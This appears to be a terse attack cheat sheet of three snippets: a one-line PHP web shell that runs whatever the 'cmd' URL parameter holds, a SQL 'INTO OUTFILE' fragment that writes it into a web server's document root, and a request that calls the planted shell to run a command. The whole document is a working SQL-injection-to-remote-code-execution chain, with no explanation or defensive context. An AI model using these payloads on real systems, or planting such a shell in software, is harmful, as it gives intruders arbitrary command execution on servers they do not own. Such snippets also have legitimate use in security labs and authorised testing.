# 1
<?php echo(system($_GET["cmd"])); ?>

# 2
INTO OUTFILE '/var/www/html/rce.php'

# 3
rce.php?cmd=uname -a

